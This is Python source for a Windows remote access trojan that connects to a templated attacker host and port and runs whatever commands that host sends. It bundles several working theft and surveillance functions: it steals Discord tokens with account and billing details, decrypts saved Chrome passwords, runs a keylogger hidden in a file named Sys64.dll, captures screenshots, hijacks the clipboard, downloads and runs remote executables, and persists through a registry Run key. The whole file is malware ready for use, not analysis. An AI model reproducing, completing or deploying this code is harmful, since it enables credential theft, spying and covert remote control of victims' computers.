import socket
import json
import subprocess
import os
import pyautogui
import threading
import shutil
import sys
from  os.path import isfile
import random
import string
from requests import  get
from webbrowser import  open as op
import getpass
import ctypes
from pynput.keyboard import Listener
import time

import sqlite3
import base64
from urllib.request import Request, urlopen

from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.ciphers import (
    Cipher, algorithms, modes)
def changeclip(change):
    try:
        subprocess.Popen("powershell -c Set-Clipboard "+change,shell=True)
        reliable_send('Target Clipoard Changed to '+change)
    except:
        reliable_send('[-]ERROR')
def say(something):
    subprocess.call("powershell -c Add-Type -AssemblyName System.Speech;$synth = New-Object -TypeName System.Speech.Synthesis.SpeechSynthesizer;$synth.Speak('"+something+"')",shell=True)



def getUserData(token):
    try:
        return json.loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=getHeader(token))).read().decode())
    except:
        pass
def paymentMethods(token):
    try:
        return bool(len(json.loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/billing/payment-sources",
                                              headers=getHeader(token))).read().decode())) > 0)
    except:
        pass

def getHeader(token=None, content_type="application/json"):
    headers = {
        "Content-Type": content_type,
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36"
    }
    if token:
        headers.update({"Authorization": token})
    return headers


from re import findall
LOCAL = os.getenv("LOCALAPPDATA")
ROAMING = os.getenv("APPDATA")
PATHS = {
    "Discord": ROAMING + "\\Discord",
    "Discord Canary": ROAMING + "\\discordcanary",
    "Discord PTB": ROAMING + "\\discordptb",
    "Google Chrome": LOCAL + "\\Google\\Chrome\\User Data\\Default",
    "Opera": ROAMING + "\\Opera Software\\Opera Stable",
    "Brave": LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
    "Yandex": LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default"
}

def getTokenz(path):
    path += "\\Local Storage\\leveldb"
    tokens = []
    for file_name in os.listdir(path):
        if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
            continue
        for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
            for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                for token in findall(regex, line):
                    tokens.append(token)
    return tokens
def steal():

    embeds = []
    working = []
    checked = []
    already_cached_tokens = []
    working_ids = []
    for platform, path in PATHS.items():
        if not os.path.exists(path):
            continue
        for token in getTokenz(path):
            if token in checked:
                continue
            checked.append(token)
            uid = None
            if not token.startswith("mfa."):
                try:
                    uid = base64.b64decode(token.split(".")[0].encode()).decode()
                except:
                    pass
                if not uid or uid in working_ids:
                    continue
            user_data = getUserData(token)
            if not user_data:
                continue
            working_ids.append(uid)
            working.append(token)
            username = user_data["username"] + "#" + str(user_data["discriminator"])
            user_id = user_data["id"]
            email = user_data.get("email")
            phone = user_data.get("phone")
            nitro = bool(user_data.get("premium_type"))
            billing = bool(paymentMethods(token))
            embed = {
                "color": 0x7289da,
                "fields": [
                    {
                        "name": "|Account Info|",
                        "value": f'Email: {email}\nPhone: {phone}\nNitro: {nitro}\nBilling Info: {billing}',
                        "inline": True
                    },
                    {
                        "name": "|PC Info|",
                        "value": f'Token Location: {platform}',
                        "inline": True
                    },
                    {
                        "name": "|Token|",
                        "value": token,
                        "inline": False
                    }
                ],
                "author": {
                    "name": f"{username} ({user_id})",
                },
                "footer": {
                    "text": f"nothing"
                }
            }
            embeds.append(embed)
    reliable_send('Getting Infos \n'+str(embeds))
def chromepassword():
    APP_DATA_PATH = os.environ['LOCALAPPDATA']
    DB_PATH = r'Google\Chrome\User Data\Default\Login Data'

    NONCE_BYTE_SIZE = 12

    def encrypt(cipher, plaintext, nonce):
        cipher.mode = modes.GCM(nonce)
        encryptor = cipher.encryptor()
        ciphertext = encryptor.update(plaintext)
        return (cipher, ciphertext, nonce)

    def decrypt(cipher, ciphertext, nonce):
        cipher.mode = modes.GCM(nonce)
        decryptor = cipher.decryptor()
        return decryptor.update(ciphertext)

    def get_cipher(key):
        cipher = Cipher(
            algorithms.AES(key),
            None,
            backend=default_backend()
        )
        return cipher

    def dpapi_decrypt(encrypted):
        import ctypes
        import ctypes.wintypes

        class DATA_BLOB(ctypes.Structure):
            _fields_ = [('cbData', ctypes.wintypes.DWORD),
                        ('pbData', ctypes.POINTER(ctypes.c_char))]

        p = ctypes.create_string_buffer(encrypted, len(encrypted))
        blobin = DATA_BLOB(ctypes.sizeof(p), p)
        blobout = DATA_BLOB()
        retval = ctypes.windll.crypt32.CryptUnprotectData(
            ctypes.byref(blobin), None, None, None, None, 0, ctypes.byref(blobout))
        if not retval:
            raise ctypes.WinError()
        result = ctypes.string_at(blobout.pbData, blobout.cbData)
        ctypes.windll.kernel32.LocalFree(blobout.pbData)
        return result

    def unix_decrypt(encrypted):
        if sys.platform.startswith('linux'):
            password = 'peanuts'
            iterations = 1
        else:
            raise NotImplementedError

        from Crypto.Cipher import AES
        from Crypto.Protocol.KDF import PBKDF2

        salt = 'saltysalt'
        iv = ' ' * 16
        length = 16
        key = PBKDF2(password, salt, length, iterations)
        cipher = AES.new(key, AES.MODE_CBC, IV=iv)
        decrypted = cipher.decrypt(encrypted[3:])
        return decrypted[:-ord(decrypted[-1])]

    def get_key_from_local_state():
        jsn = None
        with open(os.path.join(os.environ['LOCALAPPDATA'],
                               r"Google\Chrome\User Data\Local State"), encoding='utf-8', mode="r") as f:
            jsn = json.loads(str(f.readline()))
        return jsn["os_crypt"]["encrypted_key"]

    def aes_decrypt(encrypted_txt):
        encoded_key = get_key_from_local_state()
        encrypted_key = base64.b64decode(encoded_key.encode())
        encrypted_key = encrypted_key[5:]
        key = dpapi_decrypt(encrypted_key)
        nonce = encrypted_txt[3:15]
        cipher = get_cipher(key)
        return decrypt(cipher, encrypted_txt[15:], nonce)

    class ChromePassword:
        def __init__(self):
            self.passwordList = []

        def get_chrome_db(self):
            _full_path = os.path.join(APP_DATA_PATH, DB_PATH)
            _temp_path = os.path.join(APP_DATA_PATH, 'sqlite_file')
            if os.path.exists(_temp_path):
                os.remove(_temp_path)
            shutil.copyfile(_full_path, _temp_path)
            self.show_password(_temp_path)

        def show_password(self, db_file):
            conn = sqlite3.connect(db_file)
            _sql = 'select signon_realm,username_value,password_value from logins'
            for row in conn.execute(_sql):
                host = row[0]
                if host.startswith('android'):
                    continue
                name = row[1]
                value = self.chrome_decrypt(row[2])
                _info = 'Hostname: %s\nUsername: %s\nPassword: %s\n\n' % (host, name, value)
                self.passwordList.append(_info)
            conn.close()
            os.remove(db_file)

        def chrome_decrypt(self, encrypted_txt):
            if sys.platform == 'win32':
                try:
                    if encrypted_txt[:4] == b'\x01\x00\x00\x00':
                        decrypted_txt = dpapi_decrypt(encrypted_txt)
                        return decrypted_txt.decode()
                    elif encrypted_txt[:3] == b'v10':
                        decrypted_txt = aes_decrypt(encrypted_txt)
                        return decrypted_txt[:-16].decode()
                except WindowsError:
                    return None
            else:
                try:
                    return unix_decrypt(encrypted_txt)
                except NotImplementedError:
                    return None

        def save_passwords(self):
            with open(appd+'\\'+getpass.getuser()+'-Passwords.txt', 'w', encoding='utf-8') as f:
                f.writelines(self.passwordList)

    if __name__ == "__main__":
        Main = ChromePassword()
        Main.get_chrome_db()
        Main.save_passwords()




class Keylogger():
    keys = []
    count = 0
    flag = 0
    path = os.environ['appdata'] +'\\Sys64.dll'


    def on_press(self, key):
        self.keys.append(key)
        self.count += 1

        if self.count >= 1:
            self.count = 0
            self.write_file(self.keys)
            self.keys = []

    def read_logs(self):
        with open(self.path, 'rt') as f:
            return f.read()

    def write_file(self, keys):
        with open(self.path, 'a') as f:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find('backspace') > 0:
                    f.write(' Backspace ')
                elif k.find('enter') > 0:
                    f.write('\n')
                elif k.find('shift') > 0:
                    f.write(' Shift ')
                elif k.find('space') > 0:
                    f.write(' ')
                elif k.find('caps_lock') > 0:
                    f.write(' caps_lock ')
                elif k.find('Key'):
                    f.write(k)

    def self_destruct(self):
        self.flag = 1
        listener.stop()
        os.remove(self.path)

    def start(self):
        global listener
        with Listener(on_press=self.on_press) as listener:
            listener.join()

Len = 8
randfilename = ''.join(random.choices(string.ascii_uppercase + string.digits, k=Len))
def Mbox(title, text, style):
    return ctypes.windll.user32.MessageBoxW(0, text, title, style)
def downloadfilenet(url):
    r = get(url)
    if url[-4:] != '.exe':
        print(randfilename)
        reliable_send('[-] this function work just with .exe files')
    else:
        with open(appd + '\\' + randfilename + '.exe', 'wb') as file:
            file.write(r.content)
        try:
            reliable_send('executing file in ' + randfilename + '.exe')
            os.popen(appd + '\\' + randfilename + '.exe')

        except:
            reliable_send('[-]ERROR')
def getip():
    try:
        r = get('http://ifconfig.me')
        reliable_send('public ip is '+r.text)
    except:
        reliable_send('[-] ERROR')
appd =os.getenv('appdata')
def isuac():
    try:
        tmp = os.listdir(os.sep.join([os.environ.get('SystemRoot','C:\\windows'),'temp']))
    except:
        reliable_send('USER Acces')
    else:
        reliable_send('ADMIN Acces')
def reliable_send(data):
    jsondata = json.dumps(data)
    s.send(jsondata.encode())

def reliable_recv():
    data = ''
    while True:
        try:
            data = data + s.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

def download_file(file_name):
    if isfile(file_name) == True:
        f = open(file_name, 'wb')
        s.settimeout(1)
        chunk = s.recv(1024)
        while chunk:
            f.write(chunk)
            try:
                chunk = s.recv(1024)
            except socket.timeout as e:
                break
        s.settimeout(None)
        f.close()
    else:
        reliable_send('DIDN t find the file')


def upload_file(file_name):
    if isfile(file_name) == True:

        f = open(file_name, 'rb')
        s.send(f.read())


def screenshot():
    myScreenshot = pyautogui.screenshot()
    myScreenshot.save(appd+'\\screen.png')

def persist(reg_name, copy_name):
    file_location = os.environ['appdata'] + '\\' + copy_name
    try:
        if not os.path.exists(file_location):
            shutil.copyfile(sys.executable, file_location)
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v ' + reg_name + ' /t REG_SZ /d "' + file_location + '"', shell=True)
            reliable_send('[+] Created Persistence With Reg Key: ' + reg_name)
        else:
            reliable_send('[+] Persistence Already Exists')
    except:
        reliable_send('[+] Error Creating Persistence With The Target Machine')

def connection():
    while True:
        time.sleep(20)
        try:
            s.connect(('$lhost', $lport))
            shell()
            s.close()
            break
        except Exception as e:
            print(e)
            connection()

def shell():
    while True:
        command = reliable_recv()
        if command == 'quit':
            break
        elif command == 'background':
            pass
        elif command == 'help':
            pass
        elif command == 'clear':
            pass

        elif command[:2] == 'cd':
            try:
                os.chdir(command[3:])
                reliable_send('Changing Directory')
            except:
                reliable_send('Directory Not Found')
                continue
        elif command[:7] == 'appdata':
            try:
                reliable_send('Going to Roaming Dir')
                os.chdir(os.getenv('appdata'))
            except:
                reliable_send('[-]Error')

        elif command[:6] == 'upload':
            try:
                download_file(command[7:])
            except:
                reliable_send('ERROR')
                continue
        elif command[:8] == 'download':
            try:
                upload_file(command[9:])
            except:
                reliable_send('ERROR')
                continue
        elif command == 'back':
            pass
        elif command[:10] == 'screenshot':
            screenshot()
            upload_file(appd+'\\screen.png')
            os.remove(appd+'\\screen.png')
        elif command[:4] == 'priv':
            try:
                isuac()
            except:
                reliable_send('[-]ERROR')
        elif command[:3] == 'say':
            try:
                reliable_send('[+]Executed')
                say(command[4:])
            except:
                reliable_send('[-] Error')
                continue
        elif command[:5] == 'dexec':
            downloadfilenet(command[6:])

        elif command[:5] == 'getip':
            getip()
        elif command[:9] == 'open_link':
            url = command[10:]

            try:
                op(url)
                reliable_send('[+]Opened Url')
            except:
                reliable_send('[-]error')
        elif command[:3] == 'pwd':
            try:
                reliable_send('you are in ' + os.getcwd() + '\n')
            except:
                reliable_send('GOT AN EROR')
                continue
        elif command[:7]== 'getuser':
            try:
                reliable_send('username is ' + getpass.getuser() + '\n')
            except:
                reliable_send('error')
                continue
        elif command[:6] == 'msgbox':
            sp = command.split('|')
            try:
                reliable_send('MsgBox Showed')
                Mbox(sp[1], sp[2], 1)
            except:
                reliable_send('[-] ERROR')
                continue
        elif command[:7] == 'run-pwr':
            try:
                reliable_send('[+] Executed \n')
                pwr = os.popen('powershell -c ' + command[8:]).read()
                reliable_send(pwr)
            except:
                reliable_send('[-]ERROR')
                continue
        elif command[:5] == 'start':
            try:
                subprocess.Popen(command[6:], shell=True)
                reliable_send('\n [+] started \n')
            except:
                reliable_send('\n [-] Failed \n')
                continue
        elif command[:12] == 'keylog_start':
            try:
                reliable_send('Starting keylogger')
                keylog = Keylogger()
                t = threading.Thread(target=keylog.start)
                t.start()

            except:
                reliable_send('[-]ERROR')
                continue
        elif command[:11] == 'keylog_dump':
            try:
                keys = open(appd + '\\Sys64.dll', 'r').read()
                reliable_send(keys)
            except:
                reliable_send('[-]ERROR')
                continue
        elif command[:12] == 'chrome_recon':
            try:
                recover = threading.Thread(target=chromepassword())
                recover.start()
                passwords = open(appd+'\\'+getpass.getuser()+'-Passwords.txt','r').read()
                reliable_send(passwords)
                os.remove(appd+'\\'+getpass.getuser()+'-Passwords.txt')
            except:
                reliable_send('[-] ERROR')
                continue
        elif command[:7] == 'disteal':
            try:
                steal()
            except:
                reliable_send('[-]ERROR')
                continue
        elif command[:4] == 'clip':
            try:
                changeclip(command[5:])
            except:
                reliable_send('')
                continue

        elif command[:11] == 'persistence':
            reg_name, copy_name = command[12:].split(' ')
            persist(reg_name, copy_name)
        elif command[:7] == 'sendall':
            try:
                reliable_send('Command Executed')
                subprocess.Popen(command[8:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                 stdin=subprocess.PIPE)
            except:
                reliable_send('[-]Failed')
        else:
            execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,stdin=subprocess.PIPE)
            result = execute.stdout.read() + execute.stderr.read()
            result = result.decode()
            reliable_send(result)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection()
